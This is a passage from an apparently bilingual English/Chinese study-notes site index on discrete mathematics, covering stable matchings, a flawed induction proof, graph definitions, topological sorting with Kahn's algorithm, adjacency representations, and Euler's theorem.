and n candidates such that the instance has at least \\(2^{n/2}\\) distinct stable matchings.</p> <p>Just begin from n = 2.</p> <p>For the following preferences:</p> <p></p> <p>both S = {(J1,C1),(J2,C2)} and T = {(C1, J2),(C2, J1)} are stable pairings.</p> <p>So we get to know that:</p> <p></p> <p>is accessable to have a total of \\(2^{n/2}\\) stable matchings.</p> <p>Q 3 Build-Up Error?</p> <p>False Claim: If every vertex in an undirected graph has degree at least 1, then the graph is connected.</p> <p>Proof? We use induction on the number of vertices n \u2265 1.</p> <p>Base case: There is only one graph with a single vertex and it has degree 0. Therefore, the base case is vacuously true, since the if-part is false.</p> <p>Inductive hypothesis: Assume the claim is true for some n \u2265 1.</p> <p>Inductive step: We prove the claim is also true for n+1. Consider an undirected graph on n vertices in which every vertex has degree at least 1. By the inductive hypothesis, this graph is connected. Now add one more vertex x to obtain a graph on (n+1) vertices.</p> <p>All that remains is to check that there is a path from x to every other vertex z. Since x has degree at least 1, there is an edge from x to some other vertex; call it y. Thus, we can obtain a path from x to z by adjoining the edge {x, y} to the path from y to z. This proves the claim for n+1.</p> <p>\u4f46\u662f\u6211\u4eec\u5f88\u5bb9\u6613\u4e3e\u51fa\u4e00\u4e2a\u53cd\u4f8b\uff1aV = {1,2,3,4} with  E = {{1,2},{3,4}}</p> <p>\u6570\u5b66\u5f52\u7eb3\u6cd5\u54ea\u91cc\u6709\u95ee\u9898\uff1f</p> <p>\u8fd9\u4e2a\u89e3\u6cd5\u5047\u5b9a n \u7684\u65f6\u5019\u6210\u7acb\u6ca1\u9519\uff0c\u4f46\u662f\u5b83\u76f4\u63a5\u5728\u5047\u60f3 n \u6210\u7acb\u7684\u60c5\u51b5\u4e0b\u53bb\u6784\u5efa n+1 \u65f6\u7684\u56fe\uff0c\u8fd9\u662f\u4e0d\u5bf9\u7684\u3002</p> <p>\u6211\u4eec\u56de\u770b\u4e4b\u524d\u4f7f\u7528\u7684\u6570\u5b66\u5f52\u7eb3\u6cd5\uff0c\u5e94\u5f53\u662f\u4ece n+1 \u60c5\u51b5\u51fa\u53d1\uff0c\u7136\u540e\u5c06\u8bc1\u660e\u8f6c\u53d8\u6210 n \u6216\u8005\u66f4\u5c0f\u7684\u6570\u7684\u60c5\u51b5\uff0c\u800c\u975e\u4ece n \u51fa\u53d1\uff01\u7b80\u800c\u8a00\u4e4b\uff0c\u5e94\u5f53\u9075\u5faa\u4ee5\u4e0b\u539f\u5219\uff1a</p> <p>shrink down, grow back \uff08\u51cf\u5c0f\u6765\uff0c\u518d\u52a0\u56de\u53bb\uff09</p> <p>\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5c31\u662f\u8981\u4ece n+1 \u4e2a\u5ea6\u81f3\u5c11\u4e3a 1 \u7684\u7aef\u70b9\u7684\u56fe\u51fa\u53d1\uff0c\u53bb\u6389\u4efb\u610f\u4e00\u4e2a\u7aef\u70b9\uff0c\u770b\u770b\u5728\u7aef\u70b9\u81f3\u5c11\u90fd\u4e3a 1 \u7684\u60c5\u51b5\u4e0b\u56fe\u662f\u5426\u8fd8\u662f\u8fde\u63a5\u7684\u3002</p> <p>\u7136\u540e\u6211\u4eec\u5f88\u5bb9\u6613\u627e\u5230\u53cd\u4f8b\uff0c\u6700\u76f4\u63a5\u7684\uff0c\u4e00\u9897\u8db3\u591f\u5927\u7684\u6811\uff08\u6839\u7684\u5b50\u6811\u5747\u4e0d\u5c11\u4e8e 2 \u4e2a\u7aef\u70b9\uff09\u6211\u4eec\u53bb\u6389\u6839\uff0c\u6bcf\u4e2a\u7aef\u70b9\u90fd\u81f3\u5c11\u4e00\u4e2a\u5ea6\uff0c\u4f46\u662f\u663e\u7136\u5df2\u7ecf\u4e0d\u8fde\u63a5\u4e86\u3002</p> <p>Q 4 Proofs in Graphs</p> <p>Three proofs are difficult so I don't write them down, but you can get them from here if you like.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/","title":"05 Graph Theory","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i-introduction","title":"I Introduction","text":"<p>Seven Bridges Problem</p> <p>For more information you can see:Seven Bridges Problem</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i1-formal-definitons","title":"I.1 formal definitons","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i11-undirecteddirected-graph","title":"I.1.1 undirected/directed graph","text":"Undirected graph <p>Formally, a (undirected) graph is defined by a set of vertices V and a set of edges E. The vertices correspond to the little circles in Figure 1 above, and the edges correspond to the line segments between the vertices. In Figure 1, V = {A,B,C,D} and E = {{A,B},{A,B},{A,C},{B,C},{B,D},{B,D},{C,D}}. However, note that here E is a multiset (a set where an element can appear multiple times). This is because in the K\u00f6nigsberg example there are multiple bridges between a pair of banks. We will generally not consider such a situation of multiple edges between a single pair of vertices, so in our definition, we require E to be a set, not a multi-set. What this means is that between any pair of vertices there is either 0 or 1 edge. If there are multiple edges between a pair of vertices, then we collapse them into a single edge. More generally, we can also define a directed graph. If an edge in an undirected graph represents a street, then an edge in a directed graph represents a one-way street. To make this formal, let V be a set denoting the vertices of a graph G.</p> <p>For example, we can have V = {1,2,3,4}. Then, the set of (directed) edges E is a subset of V \u00d7V, i.e. E \u2286 V \u00d7V. (Recall here that U \u00d7V denotes the Cartesian product of sets U and V, defined as U \u00d7V = {(u, v) : u \u2208 U and v \u2208V}.) Continuing with our example, let E = {(1,2),(1,3),(1,4)}. Then, the corresponding graph is given below. </p> <p>We conclude that a graph is thus formally specified as an ordered pair G = (V,E) , where V is the vertex set and E is the edge set.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i12-degree","title":"I.1.2 degree","text":"<ul> <li>If G is undirected, then the degree of vertex u \u2208 V is the number of edges incident to u, i.e., degree(v)/d(v) = |{v \u2208 V : {u, v} \u2208 E}|. A vertex u whose degree is 0 is called an isolated vertex, since there is no edge which connects u to the rest of the graph.</li> <li>A directed graph, on the other hand, has two different notions of degree due to the directions on the edges. Specifically, the in-degree d-(v) of a vertex u is the number of edges from other vertices to u, and the out-degree d+(v) of u is the number of edges from u to other vertices.</li> <li>if d(v) == 1, we name this node \"pendant node\".</li> <li>if : for every v \u2208 V, d(v) is same to others, then we call this graph \"regular graph\".</li> </ul> <p>for example, G 2 (shown above) is a regular graph.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i13-simple-paths-walks-and-cycles","title":"I.1.3 (Simple) Paths, walks, and cycles","text":"<p>(simple) paths: Let G = (V,E) be an undirected graph. A path in G is a sequence of edges {v1, v2},{v2, v3},...,{vn\u22122, vn\u22121},{vn\u22121, vn}. In this case we say that there is a path between v1 and vn.</p> <p></p> <p>cycles: In this class, we assume a path is simple, meaning v1,..., vn are distinct. if you wanted drive from house 1 to 3 via house 2, why would you visit house 2 more than once? A cycle (or circuit) is a sequence of edges {v1, v2},{v2, v3},...,{vn\u22122, vn\u22121},{vn\u22121, vn},{vn, v1}, where v1,..., vn are distinct.</p> <p>walk: Suppose now that your aim is not to go from 1 to 3 as quickly as possible, but to take a leisurely stroll from 1 to 3 via the sequence {1,2},{2,1},{1,4},{4,3}. A sequence of edges with possibly repeated vertices, such as this one, is called a walk from 1 to 3.</p> <p>Analogous to the relationship between paths and cycles, a tour is a walk which starts and ends at the same vertex. For example, {1,2},{2,3},{3,1} is a tour.</p> <p></p> <p>just understand them and you don't have to remember the concepts of them.</p> <p>Connectivity: A graph is said to be connected if there is a path between any two distinct vertices.</p> <p></p> <p>Note that any graph (even a disconnected one) always consists of a collection of connected components, i.e., sets V1,...,Vk of vertices, such that all vertices in a set Vi are connected. For example, the graph above is not connected, but nevertheless consists of three connected components : V1 = {1,2,3}, V2 = {4}, and V3 = {5,6,7}.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i2-definition-supplement","title":"I.2 Definition supplement","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i21","title":"I.2.1 \u62df\u8def\u5f84","text":"<p>\u9876\u70b9 v1\u00a0\u5230 vm\u00a0\u7684\u00a0\u62df\u8def\u5f84\uff1a\\(v_1,e_1,v_2,e_2,v_3,\\ldots,v_{m-1},e_{m-1},v_m\\)\uff0c\u5176\u4e2d \\(e_i=&lt;v_i,v_{i+1}&gt;\\) \u6216 \\(e_i=\\{v_i,v_{i+1}\\}\\text{\u3002}\\)</p> <p>\u62df\u8def\u5f84\u7684\u8fb9\u6570\u79f0\u4e3a\u62df\u8def\u5f84\u7684 \u957f\u5ea6\u00a0\u3002</p> <p>\u8bfe\u7a0b\u7b14\u8bb0\u4e2d\u7f3a\u5c11\u4e86\u4e00\u4e9b\u4f1a\u5728\u6570\u636e\u7ed3\u6784(Data Structure) \u4e2d\u4f7f\u7528\u5230\u7684\u5b9a\u4e49\uff0c\u6839\u636e\u8bfe\u7a0b PPT \u8865\u5145\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i22-subgraph","title":"I.2.2 subgraph","text":"<ul> <li>G1=\uff0cG2= <li>V1\u2286V2\uff0cE1\u2286E2\uff0c\u79f0 G1 \u662f G2 \u7684 \u5b50\u56fe\u00a0(subgraph)</li> <li>\u5982\u679c G1 \u662f G2 \u7684\u5b50\u56fe\uff0c\u4e14 G1\u2260G2\uff0c\u5219 G1 \u662f G2 \u7684 \u771f\u5b50\u56fe </li> <li>\u5982\u679c G1 \u662f G2 \u7684\u5b50\u56fe\uff0c\u4e14 V1=V2\uff0c\u5219 G1 \u662f G2 \u7684 \u751f\u6210\u5b50\u56fe\u00a0(spanning subgraph)</li> <p>\u4f8b\u5982\uff0c\u4e0b\u65b9 2 \u4e3a 1 \u7684\u751f\u6210\u5b50\u56fe\uff0c3 \u4e3a 1 \u7684\u771f\u5b50\u56fe</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i23-complement-graph","title":"I.2.3 complement graph","text":"<ul> <li>G1=\uff0cG2= <li>V1=V2\uff0cE1\u2229E2=\u2205\uff0c  \u662f\u5b8c\u5168\u56fe\uff0c\u5219\u79f0 G1, G2 \u4e92\u4e3a\u8865\u56fe <p>\u4f8b\u5982\uff0c1 \u4e3a\u5b8c\u5168\u56fe\uff0c 2\u30013 \u4e92\u4e3a\u8865\u56fe</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i24-isomorphic","title":"I.2.4 isomorphic","text":"<p>\u8bbe G1=\uff0cG2=\uff0c\u5982\u679c\u00a0|V1|=|V2|\uff0c|E1|=|E2| \uff0c\u4e14\u53ef\u4ee5\u5c06 G1 \u4e2d V1 \u4e2d\u6240\u6709\u7684\u7ed3\u70b9\u4e00\u4e00\u5bf9\u5e94\u5730\u7f6e\u6362\u4e3a V2 \u4e2d\u7684\u7ed3\u70b9\u540d\u540e\u5f97\u5230\u7684\u56fe\u7b49\u4e8e G2\uff0c\u5219\u79f0 G1, G2 \u540c\u6784\u00a0(isomorphic) <p>\u4f8b\u5982\uff0c\u4e0b\u9762\u4e24\u4e2a\u56fe\u540c\u6784</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i25-directed-acyclic-graphdag","title":"I.2.5 Directed Acyclic Graph(DAG)","text":"<p>\u6709\u5411\u65e0\u73af\u56fe (DAG) \u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6709\u5411\u56fe\uff0c\u5b83\u5728\u56fe\u4e2d\u6ca1\u6709\u73af\uff0c\u5373\u4ece\u4efb\u610f\u9876\u70b9\u51fa\u53d1\uff0c\u4e0d\u53ef\u80fd\u7ecf\u8fc7\u82e5\u5e72\u6761\u8fb9\u56de\u5230\u8be5\u9876\u70b9\u3002\u8fd9\u6837\u7684\u56fe\u5f62\u7ed3\u6784\u5177\u6709\u4ee5\u4e0b\u7279\u70b9\uff1a</p> <ol> <li> <p>\u6709\u5411\uff1a\u56fe\u4e2d\u7684\u6bcf\u6761\u8fb9\u90fd\u6709\u4e00\u4e2a\u65b9\u5411\uff0c\u4ece\u4e00\u4e2a\u9876\u70b9\u6307\u5411\u53e6\u4e00\u4e2a\u9876\u70b9\u3002</p> </li> <li> <p>\u65e0\u73af\uff1a\u56fe\u4e2d\u6ca1\u6709\u5f62\u6210\u95ed\u73af\u7684\u8def\u5f84\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4ece\u4efb\u610f\u9876\u70b9\u5f00\u59cb\uff0c\u4e0d\u53ef\u80fd\u901a\u8fc7\u4e00\u7cfb\u5217\u8fb9\u56de\u5230\u8be5\u9876\u70b9\u3002</p> </li> <li> <p>\u9876\u70b9\u6392\u5e8f\uff1a\u7531\u4e8e\u6ca1\u6709\u73af\uff0cDAG \u4e2d\u7684\u9876\u70b9\u53ef\u4ee5\u6709\u4e00\u79cd\u7279\u6b8a\u7684\u6392\u5e8f\uff0c\u79f0\u4e3a\u62d3\u6251\u6392\u5e8f\u3002\u5728\u8fd9\u79cd\u6392\u5e8f\u4e2d\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u6761\u6709\u5411\u8fb9\u00a0uv\uff0c\u9876\u70b9\u00a0u\u00a0\u5728\u6392\u5e8f\u4e2d\u90fd\u4f4d\u4e8e\u9876\u70b9\u00a0v\u00a0\u4e4b\u524d\u3002</p> </li> </ol>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i26-topological-sorting","title":"I.2.6 Topological sorting","text":"<p>\u4ece oi-wiki \u4e0a\u7684\u6458\u5f55\u7684\u5173\u4e8e\u62d3\u6251\u6392\u5e8f\u7684\u7b14\u8bb0</p> <p>A topological order is a linear ordering of the vertices of a graph such that, for any two vertices, i , j , if i is a predecessor of j in the network then i precedes j in the linear ordering.</p> <p>\u5728\u4e00\u4e2a\u00a0DAG\uff08\u6709\u5411\u65e0\u73af\u56fe\uff09\u00a0\u4e2d\uff0c\u6211\u4eec\u5c06\u56fe\u4e2d\u7684\u9876\u70b9\u4ee5\u7ebf\u6027\u65b9\u5f0f\u8fdb\u884c\u6392\u5e8f\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u4efb\u4f55\u7684\u9876\u70b9 u \u5230 v \u7684\u6709\u5411\u8fb9  \uff0c\u90fd\u53ef\u4ee5\u6709 u \u5728 v \u7684\u524d\u9762\uff0c\u8fd9\u6837\u4e00\u4e2a\u8fc7\u7a0b\u6211\u4eec\u53ef\u4ee5\u770b\u4f5c\u662f\u62d3\u6251\u6392\u5e8f\uff1a <ol> <li> <p>\u4ece\u56fe\u4e2d\u9009\u62e9\u4e00\u4e2a\u5165\u5ea6\u4e3a\u96f6\u7684\u70b9</p> </li> <li> <p>\u8f93\u51fa\u8be5\u9876\u70b9\uff0c\u4ece\u56fe\u4e2d\u5220\u9664\u6b64\u9876\u70b9\u53ca\u5176\u6240\u6709\u7684\u51fa\u8fb9</p> </li> <li> <p>\u91cd\u590d\u4e0a\u9762\u4e24\u6b65\uff0c\u76f4\u5230\u6240\u6709\u9876\u70b9\u90fd\u8f93\u51fa\uff0c\u62d3\u6251\u6392\u5e8f\u5b8c\u6210</p> </li> </ol> <p>\u5982\u679c\u67d0\u4e00\u65f6\u523b\u56fe\u4e2d\u4e0d\u5b58\u5728\u5165\u5ea6\u4e3a\u96f6\u7684\u70b9\uff0c\u6b64\u65f6\u8bf4\u660e\u56fe\u662f\u6709\u73af\u56fe\uff0c\u62d3\u6251\u6392\u5e8f\u65e0\u6cd5\u5b8c\u6210\uff1b\u56e0\u6b64\u201c\u80fd\u62d3\u6251\u6392\u5e8f\u7684\u56fe == \u6709\u5411\u65e0\u73af\u56fe\u201d\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i261-activity-on-vertex-network-aov","title":"I.2.6.1 Activity On Vertex Network (AOV \u7f51)","text":"<p>\u5728 AOV \u7f51\u4e2d\uff0c \u9876\u70b9\u8868\u793a\u6d3b\u52a8\uff0c\u5f27\u8868\u793a\u6d3b\u52a8\u95f4\u7684\u4f18\u5148\u5173\u7cfb \u3002AOV \u7f51\u4e2d\u4e0d\u5e94\u8be5\u51fa\u73b0\u73af\uff0c\u8fd9\u6837\u5c31\u80fd\u591f\u627e\u5230\u4e00\u4e2a\u9876\u70b9\u5e8f\u5217\uff0c\u4f7f\u5f97\u6bcf\u4e2a\u9876\u70b9\u4ee3\u8868\u7684\u6d3b\u52a8\u7684\u524d\u9a71\u6d3b\u52a8\u90fd\u6392\u5728\u8be5\u9876\u70b9\u7684\u524d\u9762\uff0c\u8fd9\u6837\u7684\u5e8f\u5217\u79f0\u4e3a\u62d3\u6251\u5e8f\u5217\uff08\u4e00\u4e2a AOV \u7f51\u7684\u62d3\u6251\u5e8f\u5217\u4e0d\u662f\u552f\u4e00\u7684\uff09\uff0c\u7531 AOV \u7f51\u6784\u9020\u62d3\u6251\u5e8f\u5217\u7684\u8fc7\u7a0b\u79f0\u4e3a\u62d3\u6251\u6392\u5e8f\u3002</p> <ul> <li> <p>\u524d\u9a71\u6d3b\u52a8\uff1a\u6709\u5411\u8fb9\u8d77\u70b9\u7684\u6d3b\u52a8\u79f0\u4e3a\u7ec8\u70b9\u7684\u524d\u9a71\u6d3b\u52a8\uff08\u53ea\u6709\u5f53\u4e00\u4e2a\u6d3b\u52a8\u7684\u524d\u9a71\u5168\u90e8\u90fd\u5b8c\u6210\u540e\uff0c\u8fd9\u4e2a\u6d3b\u52a8\u624d\u80fd\u8fdb\u884c\uff09\u3002</p> </li> <li> <p>\u540e\u7ee7\u6d3b\u52a8\uff1a\u6709\u5411\u8fb9\u7ec8\u70b9\u7684\u6d3b\u52a8\u79f0\u4e3a\u8d77\u70b9\u7684\u540e\u7ee7\u6d3b\u52a8\u3002</p> </li> </ul> Tip <p>\u68c0\u6d4b AOV \u7f51\u4e2d\u662f\u5426\u5e26\u73af\u7684\u65b9\u5f0f\u662f\u6784\u9020\u62d3\u6251\u5e8f\u5217\uff0c\u770b\u662f\u5426\u5305\u542b\u6240\u6709\u9876\u70b9</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i262-activity-on-edge-network-aoe","title":"I.2.6.2 Activity On Edge Network (AOE \u7f51)","text":"<p>AOE \u7f51\u662f\u4e00\u4e2a \u5e26\u6743 \u7684\u6709\u5411\u65e0\u73af\u56fe\uff0c\u5176\u4e2d\uff0c \u9876\u70b9\u8868\u793a\u4e8b\u4ef6\uff0c\u5f27\u8868\u793a\u6d3b\u52a8\u6301\u7eed\u7684\u65f6\u95f4 \u3002</p> <p>\u901a\u5e38\uff0cAOE \u7f51\u53ef\u4ee5\u7528\u6765\u4f30\u7b97\u5de5\u7a0b\u7684\u5b8c\u6210\u65f6\u95f4\u3002AOE \u7f51\u5e94\u8be5\u662f\u65e0\u73af\u7684\uff0c\u4e14\u5b58\u5728\u552f\u4e00\u5165\u5ea6\u4e3a\u96f6\u7684\u8d77\u59cb\u9876\u70b9\uff08\u6e90\u70b9\uff09\uff0c\u4ee5\u53ca\u552f\u4e00\u51fa\u5ea6\u4e3a\u96f6\u7684\u5b8c\u6210\u9876\u70b9\uff08\u6c47\u70b9\uff09\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i2621-aoe","title":"I.2.6.2.1 AOE \u7f51\u76f8\u5173\u6982\u5ff5","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i2622","title":"I.2.6.2.2 \u6c42\u89e3\u5173\u952e\u8def\u5f84","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i263-kahn-algorithm","title":"I.2.6.3 Kahn algorithm","text":"<p>\u5148\u6765\u81ea\u00a0Wikipedia\u00a0\u7684\u4f2a\u4ee3\u7801</p> <pre><code>L \u2190 Empty list that will contain the sorted elements \nS \u2190 Set of all nodes with no incoming edges \nwhile S is not empty do \n    remove a node n from S \n    insert n into L \n    for each node m with an edge e from n to m do \n        remove edge e from the graph \n        if m has no other incoming edges then \n            insert m into S \nif graph has edges then \n    return error (graph has at least one cycle) \nelse \n    return L (a topologically sorted order)\n</code></pre> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u4ece\u4e00\u4e2a\u56fe\u4e2d\uff0c\u6211\u4eec\u51c6\u5907\u4e24\u4e2a\u7a7a\u96c6\u5408 S &amp; L</p> <ol> <li>\u53d6\u5165\u5ea6\u4e3a 0 \u7684\u6240\u6709\u9876\u70b9\u653e\u5165 S \u4e2d</li> <li>\u5728 S \u4e0d\u4e3a\u7a7a\u7684\u60c5\u51b5\u4e0b\uff0c\u4efb\u53d6\u4e00\u4e2a\u9876\u70b9 v \u653e\u5165 L \u4e2d\uff0c\u5e76\u65ad\u5f00\u4e0e v \u76f8\u8fde\u7684\u6240\u6709\u8fb9\uff0c\u91cd\u590d\u6b65\u9aa4 1 \u76f4\u5230 S \u4f9d\u65e7\u4e3a\u7a7a</li> <li> <p>\u5f53 S \u4e3a\u7a7a\u65f6\uff0c\u7ed3\u675f</p> <ul> <li>\u82e5\u56fe\u4e2d\u4efb\u7136\u6709\u8fb9\uff0c\u8bf4\u660e\u539f\u56fe\u4e0d\u662f DAG\uff1b</li> <li>\u82e5\u56fe\u4e2d\u65e0\u8fb9\uff0cL \u5c31\u662f\u62d3\u6251\u6392\u5e8f\u7684\u7ed3\u679c\u3002</li> </ul> </li> </ol> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i2631-implement-of-kahn-algorithm","title":"I.2.6.3.1 implement of kahn algorithm","text":"<p>\u5b9e\u73b0\u90e8\u5206\u4f7f\u7528\u4e86 C++\uff0c\u8bfb\u8005\u81ea\u884c\u9605\u8bfb \u5b9e\u73b0\uff1b\u5982\u679c\u6709\u65f6\u95f4\u5199\u4e00\u4e2a C \u7248\u672c\u7684\u653e\u5728\u8fd9\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#i27-adjacency-matrix-adjency-link","title":"I.2.7 Adjacency Matrix &amp; Adjency link","text":"<p>\u90bb\u63a5\u77e9\u9635\uff08Adjacency Matrix\uff09 \u662f\u4e00\u79cd\u8868\u793a\u56fe\u7684\u65b9\u6cd5\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u6709\u00a0n\u00a0\u4e2a\u9876\u70b9\u7684\u56fe\uff0c\u5176\u90bb\u63a5\u77e9\u9635\u662f\u4e00\u4e2a\u00a0n\u00d7n\u00a0\u7684\u77e9\u9635\u00a0A\uff0c\u5176\u4e2d \\(A[i][j]\\)\u00a0\u7684\u503c\u8868\u793a\u9876\u70b9\u00a0i\u00a0\u548c\u9876\u70b9\u00a0j\u00a0\u4e4b\u95f4\u7684\u8fde\u63a5\u60c5\u51b5\uff0c\u5373</p> <p></p> <p>\uff08\u56fe\u7247\u622a\u56fe\u4e8e Pipipi \u306e blog\uff09</p> <ul> <li>\u5bf9\u4e8e\u65e0\u5411\u56fe<ul> <li>\u5982\u679c\u9876\u70b9\u00a0i\u00a0\u548c\u9876\u70b9\u00a0j\u00a0\u4e4b\u95f4\u6709\u4e00\u6761\u8fb9\uff0c\u5219\u00a0\\(A[i][j] = A[j][i] = 1\\)</li> <li>\u5982\u679c\u6ca1\u6709\u76f4\u63a5\u8fde\u63a5\uff0c\u5219\u4e3a 0</li> <li>\u7531\u4e8e\u662f\u65e0\u5411\u56fe\uff0c\u90bb\u63a5\u77e9\u9635\u662f \u5bf9\u79f0 \u7684</li> </ul> </li> <li>\u5bf9\u4e8e\u6709\u5411\u56fe<ul> <li>\u5982\u679c\u4ece\u9876\u70b9\u00a0i\u00a0\u5230\u9876\u70b9\u00a0j\u00a0\u6709\u4e00\u6761\u5f27\uff0c\u5219\u00a0\\(A[i][j]\\) \u4e3a 1</li> <li>\u5982\u679c\u4e0d\u5b58\u5728\u8fd9\u6837\u7684\u5f27\uff0c\u5219\u4e3a 0</li> <li>\u5728\u6709\u5411\u56fe\u4e2d\uff0c\u90bb\u63a5\u77e9\u9635\u53ef\u80fd\u4e0d\u5bf9\u79f0</li> </ul> </li> </ul> <p>Info</p> <p>\u90bb\u63a5\u77e9\u9635\u53ef\u4ee5\u7528\u4e8e\u5404\u79cd\u56fe\u7b97\u6cd5\u4e2d\uff0c\u4f8b\u5982\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff08DFS\uff09\u3001\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff08BFS\uff09\u3001Dijkstra \u7b97\u6cd5\u548c Floyd-Warshall \u7b97\u6cd5\u7b49\u3002\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u65b9\u5f0f\u6765\u68c0\u67e5\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u662f\u5426\u6709\u4e00\u6761\u8fb9\uff0c\u4ee5\u53ca\u83b7\u53d6\u4e00\u4e2a\u9876\u70b9\u7684\u6240\u6709\u90bb\u63a5\u70b9</p> <p>\u4e0d\u96be\u5f97\u77e5\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N^{2})\\)\uff0c\u5728\u6570\u636e\u8f83\u5927\u65f6\u96be\u4ee5\u63a5\u53d7\uff0c\u53ef\u80fd\u66f4\u9002\u5408\u4f7f\u7528\u90bb\u63a5\u8868</p> <p>\u90bb\u63a5\u5217\u8868\uff08Adjacency List\uff09 \u662f\u56fe\u7684\u4e00\u79cd\u5e38\u89c1\u8868\u793a\u65b9\u6cd5</p> <p>\u5b9e\u73b0\uff1a</p> <p></p> <ul> <li>\u9876\u70b9\u6570\u7ec4\uff1a\u4e00\u4e2a\u6570\u7ec4\uff0c\u7528\u4e8e\u5b58\u50a8\u56fe\u4e2d\u7684\u6240\u6709\u9876\u70b9\u3002</li> <li>\u90bb\u63a5\u5217\u8868\uff1a\u5bf9\u4e8e\u6bcf\u4e2a\u9876\u70b9\uff0c\u90fd\u6709\u4e00\u4e2a\u5217\u8868\uff08\u901a\u5e38\u662f\u4e00\u4e2a\u94fe\u8868\u6216\u6570\u7ec4\uff09\uff0c\u5b58\u50a8\u4e86\u6240\u6709\u4e0e\u8be5\u9876\u70b9\u76f4\u63a5\u76f8\u8fde\u7684\u5176\u4ed6\u9876\u70b9\u3002\u5728\u65e0\u5411\u56fe\u4e2d\uff0c\u5982\u679c\u9876\u70b9A\u4e0e\u9876\u70b9B\u76f8\u8fde\uff0c\u90a3\u4e48A\u7684\u90bb\u63a5\u5217\u8868\u5c06\u5305\u542bB\uff0c\u540c\u65f6B\u7684\u90bb\u63a5\u5217\u8868\u4e5f\u5c06\u5305\u542bA\u3002\u5728\u6709\u5411\u56fe\u4e2d\uff0c\u5982\u679c\u5b58\u5728\u4eceA\u5230B\u7684\u8fb9\uff0c\u5219A\u7684\u90bb\u63a5\u5217\u8868\u5c06\u5305\u542bB\uff0c\u4f46\u4e0d\u4e00\u5b9a\u610f\u5473\u7740B\u7684\u90bb\u63a5\u5217\u8868\u5305\u542bA\u3002</li> </ul> <p>\u90bb\u63a5\u5217\u8868\u7684\u4f18\u52bf\u5728\u4e8e\u5b83\u7684\u7a7a\u95f4\u6548\u7387\u3002</p> <p>\u5bf9\u4e8e\u6709\u00a0V\u00a0\u4e2a\u9876\u70b9\u548c\u00a0E\u00a0\u6761\u8fb9\u7684\u56fe\uff0c\u90bb\u63a5\u5217\u8868\u53ea\u9700\u8981\u00a0O(V+2E)\u00a0\u7684\u7a7a\u95f4\uff0c\u8fd9\u5728\u00a0E\u00a0\u8fdc\u5c0f\u4e8e\u00a0\\(V^{2}\\)  \u7684\u60c5\u51b5\u4e0b\u6bd4\u90bb\u63a5\u77e9\u9635\u66f4\u8282\u7701\u7a7a\u95f4\u3002\u90bb\u63a5\u5217\u8868\u4e5f\u4fbf\u4e8e\u5feb\u901f\u5730\u8bbf\u95ee\u4e00\u4e2a\u9876\u70b9\u7684\u6240\u6709\u90bb\u63a5\u70b9\uff0c\u8fd9\u5bf9\u4e8e\u56fe\u7684\u904d\u5386\u7b97\u6cd5\uff08\u5982\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u6216\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff09\u7279\u522b\u6709\u7528\u3002</p> <p>\u90bb\u63a5\u5217\u8868\u7684\u7f3a\u70b9\u662f\u67e5\u627e\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u662f\u5426\u5b58\u5728\u8fb9\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u8f83\u9ad8\uff0c\u4e3a\u00a0O(V)\u3002\u5982\u679c\u9700\u8981\u9891\u7e41\u5730\u8fdb\u884c\u8fd9\u79cd\u67e5\u627e\u64cd\u4f5c\uff0c\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u5176\u4ed6\u6570\u636e\u7ed3\u6784\uff0c\u5982\u90bb\u63a5\u77e9\u9635\u6216\u54c8\u5e0c\u8868\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#ii-revisiting-the-seven-bridges-of-koenigsberg-eulerian-tours","title":"II Revisiting the Seven Bridges of Koenigsberg: Eulerian Tours","text":"<p>Given a graph G(namely Seven Bridges Problem), is there a walk in G that uses each edge exactly once? We call any such walk in a graph an Eulerian walk. (In contrast, by definition a walk can normally visit each edge or vertex as many times as desired.)</p> <p>Moreover, if an Eulerian walk is closed, i.e., it ends at its starting point, then it is called an Eulerian tour.</p> <p>For this, define an even degree graph as a graph in which all vertices have even degree.</p> <p>THEOREM 5.1 Euler\u2019s Theorem (1736)</p> <p>An undirected graph G = (V,E) has an Eulerian tour iff G is even degree, and connected (except possibly for isolated vertices).</p> proof 